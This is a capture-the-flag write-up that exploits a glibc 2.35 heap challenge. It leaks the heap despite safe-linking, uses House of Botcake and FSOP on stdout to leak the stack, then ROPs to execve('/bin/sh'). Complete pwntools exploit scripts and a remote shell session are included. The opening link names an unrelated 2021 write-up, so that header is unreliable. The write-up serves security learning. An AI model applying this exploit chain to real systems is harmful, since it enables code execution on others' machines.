[Original writeup](https://ubcctf.github.io/2021/10/tsg2021-catastrophe/)

Original writeup (https://ubcctf.github.io/2021/10/tsg2021-catastrophe/).## Introduction

> I just learned how to use malloc and free... am I doing this right?

catastrophe is a heap challenge I did during the diceCTF 2022. I did have a
lot of issues with the libc and the dynamic linker, thus I did a first time
the challenge with the libc that was in `/lib/libc.so.6`, then I figured out
thanks to my teammate [supersnail](../../tags/supersnail) that I was using the
wrong libc. Then I did it again with the right libc but the dynamic linker was
(again) wrong and I lost a loot of time on it. So well, the challenge wasn't
pretty hard but I took a funny way to solve it because I thought the libc had
`FULL RELRO` while  it had only `PARTIAL RELRO`. Find the exploit and the
tasks [right
here](https://github.com/ret2school/ctf/tree/master/2022/diceCTF/pwn/catastrophe).

## TL; DR

- Leak heap address + defeating safe linking by printing the first free'd chunk in the tcache.  
- [House of botcake](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c) to create overlapping chunks and get arbitrary write  
- FSOP on stdout to leak `environ` and then ROP over the stack.

## What we have

catastrophe is a classic heap challenge here are the classic informations
about it:  
```  
$ ./libc.so.6  
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3) stable release version 2.35.  
Copyright (C) 2022 Free Software Foundation, Inc.  
This is free software; see the source for copying conditions.  
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A  
PARTICULAR PURPOSE.  
Compiled by GNU CC version 11.2.0.  
libc ABIs: UNIQUE IFUNC ABSOLUTE  
For bug reporting instructions, please see:  
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.  
$ checksec --file libc.so.6  
[*] '/home/nasm/Documents/ctf/2022/diceCTF/pwn/catastrophe/libc.so.6'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
$ checksec --file catastrophe  
[*] '/home/nasm/Documents/ctf/2022/diceCTF/pwn/catastrophe/catastrophe'  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
```

`2.35` libc, which means there is no more classic hooks like `__malloc_hook`
or `__free_hook`. The binary allows to:  
- malloc up to 0x200 bytes and read data in it with the use of `fgets`  
- Allocate from the index 0 to 9  
- free anything given the index is between 0 and 9

Thus we can easily do a [House of
botcake](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c)
but first of all we have to defeat the safe linking to properly getting an
arbitrary write.

## Defeat safe-linking

Since `2.32` is introduced in the libc the safe-linking mechanism that does
some xor encyptions on `tcache`, `fastbin` next fp to prevent pointer
hiijacking. Here is the core of the mechanism:  
```c  
// https://elixir.bootlin.com/glibc/latest/source/malloc/malloc.c#L340  
/* Safe-Linking:  
  Use randomness from ASLR (mmap_base) to protect single-linked lists  
  of Fast-Bins and TCache.  That is, mask the "next" pointers of the  
  lists' chunks, and also perform allocation alignment checks on them.  
  This mechanism reduces the risk of pointer hijacking, as was done with  
  Safe-Unlinking in the double-linked lists of Small-Bins.  
  It assumes a minimum page size of 4096 bytes (12 bits).  Systems with  
  larger pages provide less entropy, although the pointer mangling  
  still works.  */  
#define PROTECT_PTR(pos, ptr) \  
 ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))  
#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)  
```

Since for this challenge we're focused on `tcache`, here is how a chunk is
free'd using safe-linking:  
```c  
// https://elixir.bootlin.com/glibc/latest/source/malloc/malloc.c#L3175  
/* Caller must ensure that we know tc_idx is valid and there's room  
  for more chunks.  */  
static __always_inline void  
tcache_put (mchunkptr chunk, size_t tc_idx)  
{  
 tcache_entry *e = (tcache_entry *) chunk2mem (chunk);

 /* Mark this chunk as "in the tcache" so the test in _int_free will  
    detect a double free.  */  
 e->key = tcache_key;

 e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);  
 tcache->entries[tc_idx] = e;  
 ++(tcache->counts[tc_idx]);  
}  
```

Thus, the first time a chunk is inserted into a tcache list, `e->next` is
initialized to `&e->next >> 12` (heap base address) xor
`tcache->entries[tc_idx]` which is equal to zero when the list for a given
size is empty.

Which means to leak the heap address we simply have to print a free'd chunk
once it has been inserted in the tcache.

## House of botcake

The [House of
botcake](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c)
gives a write what where primitive by poisoning the tcache. The algorithm is:  
- Allocate 7 `0x100` sized chunks to then fill the tcache (7 entries).  
- Allocate two more `0x100` sized chunks (`prev` and `a` in the example).  
- Allocate a small "barrier" `0x10` sized chunk.  
- Fill the tcache by freeing the first 7 chunks.  
- free(a), thus `a` falls into the unsortedbin.  
- free(prev), thus `prev` is consolidated with `a` to create a large `0x221` sized chunk that is yet in the unsortedbin.  
- Request one more `0x100` sized chunk to let a single entry left in the tcache.  
- free(a) again, given `a` is part of the large `0x221` sized chunk it leads to an UAF. Thus `a` falls into the tcache.  
- That's finished, to get a write what where we just need to request a `0x130` sized chunk. Thus we can hiijack the next fp of `a` that is currently referenced by the tcache by the location we wanna write to. And next time two `0x100` sized chunks are requested, the second one will be the target location.

## Getting arbitrary write

To make use of the write what were we got thanks to the [House of
botcake](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c),
we need to get both heap and libc leak. To leak libc that's pretty easily we
just need to print out a free'd chunk stored into the unsortedbin, it's
forward pointer is not encrypted with safe-linking.

As seen previously, to bypass safe-linking we have to print a free'd chunk
once it has been inserted in the tcache. It would give us the base address of
the heap. When we got it, we just have to initialize the location we wanna
write to `location ^ ((heap_base + chunk_offset) >> 12)` to encrypt properly
the pointer, this way the primitive is efficient.

Implmentation of the [House of
botcake](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c)
+ safe-linking bypass, heap and libc leak:  
```py

io = start()

def alloc(idx, data, size):  
  io.sendlineafter("-\n> ", b"1")  
  io.sendlineafter("Index?\n> ", str(idx).encode())  
  io.sendlineafter("> ", str(size).encode())  
  io.sendlineafter(": ", data)

def free(idx):  
  io.sendlineafter("> ", b"2")  
  io.sendlineafter("> ", str(idx).encode())

def view(idx):  
  io.sendlineafter("> ", b"3")  
  io.sendlineafter("> ", str(idx).encode())

for i in range(7):  
   alloc(i, b"", 0x100)

free(0)

view(0)

heap = ((pwn.u64(io.recvline()[:-1].ljust(8, b"\x00")) << 12))  
pwn.log.info(f"heap @ {hex(heap)}")  
# then we defeated safe linking lol

alloc(0, b"YY", 0x100)  
# request back the chunk we used to leak the heap

alloc(7, b"YY", 0x100) # prev  
alloc(8, b"YY", 0x100) # a

alloc(9, b"/bin/sh\0", 0x10) # barrier

# fill tcache  
for i in range(7):  
   free(i)

free(8) # free(a) => unsortedbin  
free(7) # free(prev) => merged with a

# leak libc  
view(8)

libc = pwn.u64(io.recvline()[:-1].ljust(8, b"\x00")) - 0x219ce0 # - 0x1bebe0 #
offset of the unsorted bin

rop = pwn.ROP(libc)  
binsh = next(libc.search(b"/bin/sh\x00"))  
rop.execve(binsh, 0, 0)

environ = libc.address + 0x221200  
stdout = libc.address + 0x21a780

pwn.log.info(f"libc: {hex(libc)}")  
pwn.log.info(f"environ: {hex(environ)}")  
pwn.log.info(f"stdout: {hex(stdout)}")

alloc(0, b"YY", 0x100) # pop a chunk from the tcache to let an entry left to a  
free(8) # free(a) => tcache

alloc(1, b"T"*0x108 + pwn.p64(0x111) + pwn.p64((stdout ^ ((heap + 0xb20) >>
12))), 0x130)  
# 0x130, too big for tcache => unsortedbin UAF on a to replace a->next with
the address of the target location (stdout)  
alloc(2, b"TT", 0x100)  
# pop a from tcache

# next 0x100 request will return the target location (stdout)

"""  
0x55c4fbcd7a00: 0x0000000000000000      0x0000000000000141 [prev]  
0x55c4fbcd7a10: 0x5454545454545454      0x5454545454545454  
0x55c4fbcd7a20: 0x5454545454545454      0x5454545454545454  
0x55c4fbcd7a30: 0x5454545454545454      0x5454545454545454  
0x55c4fbcd7a40: 0x5454545454545454      0x5454545454545454  
0x55c4fbcd7a50: 0x5454545454545454      0x5454545454545454  
0x55c4fbcd7a60: 0x5454545454545454      0x5454545454545454  
0x55c4fbcd7a70: 0x5454545454545454      0x5454545454545454  
0x55c4fbcd7a80: 0x5454545454545454      0x5454545454545454  
0x55c4fbcd7a90: 0x5454545454545454      0x5454545454545454  
0x55c4fbcd7aa0: 0x5454545454545454      0x5454545454545454  
0x55c4fbcd7ab0: 0x5454545454545454      0x5454545454545454  
0x55c4fbcd7ac0: 0x5454545454545454      0x5454545454545454  
0x55c4fbcd7ad0: 0x5454545454545454      0x5454545454545454  
0x55c4fbcd7ae0: 0x5454545454545454      0x5454545454545454  
0x55c4fbcd7af0: 0x5454545454545454      0x5454545454545454  
0x55c4fbcd7b00: 0x5454545454545454      0x5454545454545454  
0x55c4fbcd7b10: 0x5454545454545454      0x0000000000000111 [a]  
0x55c4fbcd7b20: 0x00007f5d45ff5b57      0x4f60331b73b9000a  
0x55c4fbcd7b30: 0x0000000000000000      0x0000000000000000  
0x55c4fbcd7b40: 0x0000000000000000      0x00000000000000e1 [unsortedbin]  
0x55c4fbcd7b50: 0x00007f5819b0dce0      0x00007f5819b0dce0  
0x55c4fbcd7b60: 0x0000000000000000      0x0000000000000000  
0x55c4fbcd7b70: 0x0000000000000000      0x0000000000000000  
0x55c4fbcd7b80: 0x0000000000000000      0x0000000000000000  
0x55c4fbcd7b90: 0x0000000000000000      0x0000000000000000  
0x55c4fbcd7ba0: 0x0000000000000000      0x0000000000000000  
0x55c4fbcd7bb0: 0x0000000000000000      0x0000000000000000  
0x55c4fbcd7bc0: 0x0000000000000000      0x0000000000000000  
0x55c4fbcd7bd0: 0x0000000000000000      0x0000000000000000  
0x55c4fbcd7be0: 0x0000000000000000      0x0000000000000000  
0x55c4fbcd7bf0: 0x0000000000000000      0x0000000000000000  
0x55c4fbcd7c00: 0x0000000000000000      0x0000000000000000  
0x55c4fbcd7c10: 0x0000000000000000      0x0000000000000000  
0x55c4fbcd7c20: 0x00000000000000e0      0x0000000000000020  
0x55c4fbcd7c30: 0x0068732f6e69622f      0x000000000000000a  
0x55c4fbcd7c40: 0x0000000000000000      0x00000000000203c1 [top chunk]  
"""  
```

## FSOP on stdout to leak environ

I didn't see first that only `PARTIAL RELRO` was enabled on the libc, so the
technique I show you here was thought to face a `2.35` libc with `FULL RELRO`
enabled that the reason why I didn't just hiijack some GOT pointers within the
libc.

A pretty convenient way to gain code execution when the hooks
(`__malloc_hook`, `__free_hook`) are not present (since `2.32` cf [this for
2.34](https://sourceware.org/pipermail/libc-alpha/2021-August/129718.html)) is
to leak the address of the stack to then write a ROPchain on it. To leak a
stack address we can make use of the `environ` symbol stored in the dynamic
linker, it contains a pointer toward `**envp`.

To read this pointer we need a read what where primitive! Which can be
achieved through a file stream oriented programming (FSOP) attack on `stdout`
for example. To dig more FSOP I advise you to read [this write-
up](https://nasm.re/posts/onceforall/) as well as [this
one](https://nasm.re/posts/bookwriter/).

To understand the whole process I'll try to introduce you to FSOP. First of
all the target structure is stdout, we wanna corrupt stdout because it's used
ritght after the `fgets` that reads the input from the user by the `putchar`
function. Basically on linux "everything is a file" from the character device
the any stream (error, input, output, opened file) we can interact with  a
resource just by opening it and by getting a file descriptor on it, right ?
This way each file descripor has an associated structure called `FILE` you may
have used if you have already done some stuff with files on linux. Here is its
definition:  
```c  
//
https://elixir.bootlin.com/glibc/latest/source/libio/bits/types/struct_FILE.h#L49  
/* The tag name of this struct is _IO_FILE to preserve historic  
  C++ mangled names for functions taking FILE* arguments.  
  That name should not be used in new code.  */  
struct _IO_FILE  
{  
 int _flags;            /* High-order word is _IO_MAGIC; rest is flags. */

 /* The following pointers correspond to the C++ streambuf protocol. */  
 char *_IO_read_ptr;    /* Current read pointer */  
 char *_IO_read_end;    /* End of get area. */  
 char *_IO_read_base;   /* Start of putback+get area. */  
 char *_IO_write_base;  /* Start of put area. */  
 char *_IO_write_ptr;   /* Current put pointer. */  
 char *_IO_write_end;   /* End of put area. */  
 char *_IO_buf_base;    /* Start of reserve area. */  
 char *_IO_buf_end;     /* End of reserve area. */

 /* The following fields are used to support backing up and undo. */  
 char *_IO_save_base; /* Pointer to start of non-current get area. */  
 char *_IO_backup_base;  /* Pointer to first valid character of backup area */  
 char *_IO_save_end; /* Pointer to end of non-current get area. */

 struct _IO_marker *_markers;

 struct _IO_FILE *_chain;

 int _fileno;  
 int _flags2;  
 __off_t _old_offset; /* This used to be _offset but it's too small.  */

 /* 1+column number of pbase(); 0 is unknown. */  
 unsigned short _cur_column;  
 signed char _vtable_offset;  
 char _shortbuf[1];

 _IO_lock_t *_lock;  
#ifdef _IO_USE_OLD_IO_FILE  
};

struct _IO_FILE_complete  
{  
 struct _IO_FILE _file;  
#endif  
 __off64_t _offset;  
 /* Wide character stream stuff.  */  
 struct _IO_codecvt *_codecvt;  
 struct _IO_wide_data *_wide_data;  
 struct _IO_FILE *_freeres_list;  
 void *_freeres_buf;  
 size_t __pad5;  
 int _mode;  
 /* Make sure we don't get into trouble again.  */  
 char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];  
};  
```

Here are brievly role of each fields:  
- `_flags` stands for the behaviour of the stream when a file operation occurs.  
- `_IO_read_ptr` address of input within the input buffer that has been already used.   
- `_IO_read_end` end address of the input buffer.   
- `_IO_read_base` base address of the input buffer.  
- `_IO_write_base` base address of the ouput buffer.  
- `_IO_write_ptr` points to the character that hasn't been printed yet.  
- `_IO_write_end` end address of the output buffer.  
- `_IO_buf_base` base address for both input and output buffer.  
- `_IO_buf_end` end address for both input and output buffer.  
- `_chain` stands for the single linked list that links of all file streams.  
- `_fileno` stands for the file descriptor associated to the file.  
- `_vtable_offset` stands for the offset of the vtable we have to use.  
- `_offset` stands for the current offset within the file.

Relatable flags:  
- `_IO_USER_BUF` During line buffered output, _IO_write_base==base() && epptr()==base(). However, ptr() may be anywhere between base() and ebuf(). This forces a call to filebuf::overflow(int C) on every put. If there is more space in the buffer, and C is not a '\n', then C is inserted, and pptr() incremented.  
- `_IO_MAGIC` Magic number of `fp->_flags`.  
- `_IO_UNBUFFERED` If a filebuf is unbuffered(), the _shortbuf[1] is used as the buffer.  
- `_IO_LINKED` In the list of all open files.

To understand I advise you to read this [great article](https://ray-
cp.github.io/archivers/IO_FILE_arbitrary_read_write) about FILE structures.
What we gonna do right now is trying to understand the use of `stdout` during
within the `putchar` function. And we will try to find a code path that will
not write the provided argument (in this case the `\n` taken by `putchar`)
into the output buffer we control but rather flush the file stream to directly
print its content and then print the provided argument. This way we could get
an arbitrary read by controlling the output buffer.  
Let's take a closer look at the ` __putc_unlocked_body` macro:  
```c

//
https://elixir.bootlin.com/glibc/latest/source/libio/bits/types/struct_FILE.h#L106  
#define __putc_unlocked_body(_ch, _fp)                                  \  
 (__glibc_unlikely ((_fp)->_IO_write_ptr >= (_fp)->_IO_write_end)       \  
  ? __overflow (_fp, (unsigned char) (_ch))                             \  
  : (unsigned char) (*(_fp)->_IO_write_ptr++ = (_ch)))

```

It ends up calling `__overflow` if there is no more space in the output buffer
(`(_fp)->_IO_write_ptr >= (_fp)->_IO_write_end)`). That's basically the code
path we need to trigger to call `__overflow` instead of just write the
provided char into the output buffer.  
So first condition:  
- `(_fp)->_IO_write_ptr >= (_fp)->_IO_write_end`

```c  
// https://elixir.bootlin.com/glibc/latest/source/libio/genops.c#L198  
int  
__overflow (FILE *f, int ch)  
{  
 /* This is a single-byte stream.  */  
 if (f->_mode == 0)  
   _IO_fwide (f, -1);  
 return _IO_OVERFLOW (f, ch);  
}  
```

Given the file stream isn't oriented (byte granularity) we directly reach the
`_IO_OVERFLOW` call, now the final goal to get a leak is to reach the
`_IO_do_write` call:  
```c  
// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L730

int  
_IO_new_file_overflow (FILE *f, int ch)  
{  
 if (f->_flags & _IO_NO_WRITES) /* SET ERROR */  
   {  
     f->_flags |= _IO_ERR_SEEN;  
     __set_errno (EBADF);  
     return EOF;  
   }  
 /* If currently reading or no buffer allocated. */  
 if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)  
   {  
     /* Allocate a buffer if needed. */  
     if (f->_IO_write_base == NULL)  
	{  
	  _IO_doallocbuf (f);  
	  _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);  
	}  
     /* Otherwise must be currently reading.  
	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,  
	 logically slide the buffer forwards one block (by setting the  
	 read pointers to all point at the beginning of the block).  This  
	 makes room for subsequent output.  
	 Otherwise, set the read pointers to _IO_read_end (leaving that  
	 alone, so it can continue to correspond to the external position). */  
     if (__glibc_unlikely (_IO_in_backup (f)))  
	{  
	  size_t nbackup = f->_IO_read_end - f->_IO_read_ptr;  
	  _IO_free_backup_area (f);  
	  f->_IO_read_base -= MIN (nbackup,  
				   f->_IO_read_base - f->_IO_buf_base);  
	  f->_IO_read_ptr = f->_IO_read_base;  
	}

     if (f->_IO_read_ptr == f->_IO_buf_end)  
	    f->_IO_read_end = f->_IO_read_ptr = f->_IO_buf_base;  
     f->_IO_write_ptr = f->_IO_read_ptr;  
     f->_IO_write_base = f->_IO_write_ptr;  
     f->_IO_write_end = f->_IO_buf_end;  
     f->_IO_read_base = f->_IO_read_ptr = f->_IO_read_end;

     f->_flags |= _IO_CURRENTLY_PUTTING;  
     if (f->_mode <= 0 && f->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))  
	f->_IO_write_end = f->_IO_write_ptr;  
   }  
 if (ch == EOF)  
   return _IO_do_write (f, f->_IO_write_base,  
			 f->_IO_write_ptr - f->_IO_write_base);  
 if (f->_IO_write_ptr == f->_IO_buf_end ) /* Buffer is really full */  
   if (_IO_do_flush (f) == EOF)  
     return EOF;  
 *f->_IO_write_ptr++ = ch;  
 if ((f->_flags & _IO_UNBUFFERED)  
     || ((f->_flags & _IO_LINE_BUF) && ch == '\n'))  
   if (_IO_do_write (f, f->_IO_write_base,  
		      f->_IO_write_ptr - f->_IO_write_base) == EOF)  
     return EOF;  
 return (unsigned char) ch;  
}  
libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)

```

Given `ch` is `\n`, to trigger the `_IO_do_flush` call which will flush the
file stream we have to:  
- Remove `_IO_NO_WRITES` from `fp->_flags` to avoid the first condition.  
- Add `_IO_CURRENTLY_PUTTING` to `fp->_flags` and give a non `NULL` value to `f->_IO_write_base` to avoid the second condition (useless code).  
- make `f->_IO_write_ptr` equal to `f->_IO_buf_end` to then call `_IO_do_flush`.

Now we reached `_IO_do_flush` which is basically just a macro:  
```c

// https://elixir.bootlin.com/glibc/latest/source/libio/libioP.h#L507  
#define _IO_do_flush(_f) \  
 ((_f)->_mode <= 0
\  
  ? _IO_do_write(_f, (_f)->_IO_write_base,
\  
		  (_f)->_IO_write_ptr-(_f)->_IO_write_base)		      \  
  : _IO_wdo_write(_f, (_f)->_wide_data->_IO_write_base,               \  
		   ((_f)->_wide_data->_IO_write_ptr			      \  
		    - (_f)->_wide_data->_IO_write_base)))

```

Given `stdout` is byte-oriented `_IO_new_do_write` is called:  
```c

// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L418  
static size_t new_do_write (FILE *, const char *, size_t);

/* Write TO_DO bytes from DATA to FP.  
  Then mark FP as having empty buffers. */

int  
_IO_new_do_write (FILE *fp, const char *data, size_t to_do)  
{  
 return (to_do == 0  
	  || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;  
}  
libc_hidden_ver (_IO_new_do_write, _IO_do_write)

static size_t  
new_do_write (FILE *fp, const char *data, size_t to_do)  
{  
 size_t count;  
 if (fp->_flags & _IO_IS_APPENDING)  
   /* On a system without a proper O_APPEND implementation,  
      you would need to sys_seek(0, SEEK_END) here, but is  
      not needed nor desirable for Unix- or Posix-like systems.  
      Instead, just indicate that offset (before and after) is  
      unpredictable. */  
   fp->_offset = _IO_pos_BAD;  
 else if (fp->_IO_read_end != fp->_IO_write_base)  
   {  
     off64_t new_pos  
	= _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);  
     if (new_pos == _IO_pos_BAD)  
	    return 0;  
     fp->_offset = new_pos;  
   }  
 count = _IO_SYSWRITE (fp, data, to_do);  
 if (fp->_cur_column && count)  
   fp->_cur_column = _IO_adjust_column (fp->_cur_column - 1, data, count) + 1;  
 _IO_setg (fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);  
 fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_buf_base;  
 fp->_IO_write_end = (fp->_mode <= 0  
		       && (fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))  
		       ? fp->_IO_buf_base : fp->_IO_buf_end);  
 return count;  
}

```

To avoid the `_IO_SYSSEEK` which could break stdout, we can add
`_IO_IS_APPENDING` to `fp->_flags`. Then `_IO_SYSWRITE` is called and prints
`(_f)->_IO_write_ptr-(_f)->_IO_write_base` bytes from `(_f)->_IO_write_base`
to stdout. But that's not finished, right after we got the stack leak
`new_do_write` initializes the output / input buffer to `_IO_buf_base` except
for the output buffer which is initialized to `_IO_buf_end` (`_IO_LINE_BUF`
not present). Thus we have to make `fp->_IO_buf_base` and `fp->_IO_buf_end`
equal to valid writable pointers.

Thus we just need to:  
- `fp->_flags` = (`fp->_flags` & ~(`_IO_NO_WRITES`)) | `_IO_CURRENTLY_PUTTING` | `_IO_IS_APPENDING`.  
- `f->_IO_write_ptr` = `fp->_IO_write_end` = `f->_IO_buf_end` = `&environ + 8`.  
- `fp->_IO_write_base` = `&environ`.

Which gives:  
```py

alloc(3,  
   pwn.p64(0xfbad1800) + # _flags  
   pwn.p64(environ)*3 + # _IO_read_*  
   pwn.p64(environ) + # _IO_write_base  
   pwn.p64(environ + 0x8)*2 + # _IO_write_ptr + _IO_write_end  
   pwn.p64(environ + 8) + # _IO_buf_base  
   pwn.p64(environ + 8) # _IO_buf_end  
   , 0x100)

stack = pwn.u64(io.recv(8)[:-1].ljust(8, b"\x00")) - 0x130 - 8  
# Offset of the saved rip that belongs to frame of the op_malloc function  
pwn.log.info(f"stack: {hex(stack)}")

```

## ROPchain

Now we leaked the stack address we finally just need to achieve another
arbitrary write to craft the ROPchain onto the `op_malloc` function that
writes the user input into the requested chunk.

To get the arbitrary write we just have to use the same overlapping chunks
technique than last time, let's say we wanna write to `target` and we have
`prev` that overlaps `victim`:  
- `free(prev)` ends up in the tcachebin (0x140), it has already been consolidated, it *already* overlaps `victim`.  
- `free(victim)` ends up in the tcachebin (0x110).  
- `malloc(0x130)` returns `prev`, thus we can corrupt `victim->next` and intialize it to `(target ^ ((chunk_location) >> 12)` to bypass safe-linking.  
- `malloc(0x100)` returns `victim` and tcachebin (0x110) next free chunk is `target`.  
- `malloc(0x100)` gives a write what where.

When we got the write what where on the stack we simply have to craft a call
ot system since there is no `seccomp` shit.  
Here is the script:  
```py  
free(1) # prev  
free(2) # victim

alloc(5, b"T"*0x108 + pwn.p64(0x111) + pwn.p64((stack ^ ((heap + 0xb20) >>
12))), 0x130)  
# victim->next = target  
alloc(2, b"TT", 0x100)

alloc(3, pwn.p64(stack) + rop.chain(), 0x100) # overwrite sRBP for nothing
lmao  
# ROPchain on do_malloc's stackframe  
```

And here we are:  
```bash  
nasm@off:~/Documents/pwn/diceCTF/catastrophe/f2$ python3 sexploit.py REMOTE
HOST=mc.ax PORT=31273  
[*] '/home/nasm/Documents/pwn/diceCTF/catastrophe/f2/catastrophe'  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
[+] Opening connection to mc.ax on port 31273: Done  
/home/nasm/.local/lib/python3.10/site-packages/pwnlib/tubes/tube.py:822:
BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See
https://docs.pwntools.com/#bytes  
 res = self.recvuntil(delim, timeout=timeout)  
[*] heap @ 0x559cb0184000  
[*] libc: 0x7efe8a967000  
[*] environ: 0x7efe8ab88200  
[*] stdout: 0x7efe8ab81780  
[*] stack: 0x7ffe06420710  
[*] Switching to interactive mode  
$ id  
uid=1000 gid=1000 groups=1000  
$ ls  
flag.txt  
run  
$ cat flag.txt  
hope{apparently_not_good_enough_33981d897c3b0f696e32d3c67ad4ed1e}  
```

## Resources  
- [a1ex.online](https://a1ex.online/2020/10/01/glibc-IO%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/)  
- [ray-cp](https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write)  
- [Mutepig's Blog](http://blog.leanote.com/post/mut3p1g/file-struct)

## Appendices

Final exploit:  
```py  
#!/usr/bin/env python  
# -*- coding: utf-8 -*-

# this exploit was generated via  
# 1) pwntools  
# 2) ctfmate

import os  
import time  
import pwn

# Set up pwntools for the correct architecture  
exe = pwn.context.binary = pwn.ELF('catastrophe')  
pwn.context.delete_corefiles = True  
pwn.context.rename_corefiles = False  
pwn.context.timeout = 2000

host = pwn.args.HOST or '127.0.0.1'  
port = int(pwn.args.PORT or 1337)

def local(argv=[], *a, **kw):  
   '''Execute the target binary locally'''  
   if pwn.args.GDB:  
       return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)  
   else:  
       return pwn.process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):  
   '''Connect to the process on the remote host'''  
   io = pwn.connect(host, port)  
   if pwn.args.GDB:  
       pwn.gdb.attach(io, gdbscript=gdbscript)  
   return io

def start(argv=[], *a, **kw):  
   '''Start the exploit against the target.'''  
   if pwn.args.LOCAL:  
       return local(argv, *a, **kw)  
   else:  
       return remote(argv, *a, **kw)

gdbscript = '''  
b* main  
source ~/Downloads/pwndbg/gdbinit.py  
continue  
'''.format(**locals())

io = None

libc = pwn.ELF("libc.so.6")

io = start()

def alloc(idx, data, size, s=False):  
  io.sendlineafter("-\n> ", b"1")  
  io.sendlineafter("Index?\n> ", str(idx).encode())  
  io.sendlineafter("> ", str(size).encode())  
  
  if s:  
      io.sendafter(": ", data)   
  else:  
      io.sendlineafter(": ", data) 

def free(idx):  
  io.sendlineafter("> ", b"2")  
  io.sendlineafter("> ", str(idx).encode())

def view(idx):  
  io.sendlineafter("> ", b"3")  
  io.sendlineafter("> ", str(idx).encode())

for i in range(7):  
   alloc(i, b"", 0x100)  
free(0)

view(0)

heap = ((pwn.u64(io.recvline()[:-1].ljust(8, b"\x00")) << 12))  
pwn.log.info(f"heap @ {hex(heap)}")  
# then we defeated safe linking lol

alloc(0, b"YY", 0x100)

alloc(7, b"YY", 0x100)  
alloc(8, b"YY", 0x100)

alloc(9, b"/bin/sh\0", 0x10)

for i in range(7):  
   free(i)

alloc(9, b"YY", 100)  
free(9)

free(8)  
free(7)  
view(8)

libc.address = pwn.u64(io.recvline()[:-1].ljust(8, b"\x00")) - 0x219ce0 # -
0x1bebe0 # offset of the unsorted bin

rop = pwn.ROP(libc)  
binsh = next(libc.search(b"/bin/sh\x00"))  
rop.execve(binsh, 0, 0)

environ = libc.address + 0x221200  
stdout = libc.address + 0x21a780

pwn.log.info(f"libc: {hex(libc.address)}")  
pwn.log.info(f"environ: {hex(environ)}")  
pwn.log.info(f"stdout: {hex(stdout)}")

alloc(0, b"YY", 0x100)  
free(8)  
alloc(1, b"T"*0x108 + pwn.p64(0x111) + pwn.p64((stdout ^ ((heap + 0xb20) >>
12))), 0x130)  
alloc(2, b"TT", 0x100)  
alloc(3, pwn.p32(0xfbad1800) + pwn.p32(0) + pwn.p64(environ)*3 +
pwn.p64(environ) + pwn.p64(environ + 0x8)*2 + pwn.p64(environ + 8) +
pwn.p64(environ + 8), 0x100)

stack = pwn.u64(io.recv(8)[:-1].ljust(8, b"\x00")) - 0x130 - 8# - 0x1bebe0 #
offset of the unsorted bin  
pwn.log.info(f"stack: {hex(stack)}")

free(1) # large  
free(2)

alloc(5, b"T"*0x108 + pwn.p64(0x111) + pwn.p64((stack ^ ((heap + 0xb20) >>
12))), 0x130)  
alloc(2, b"TT", 0x100)

alloc(3, pwn.p64(stack) + rop.chain(), 0x100) # overwrite sRBP for nothing
lmao

io.interactive()  
```  

Original writeup (https://ret2school.github.io/post/catastrophe/).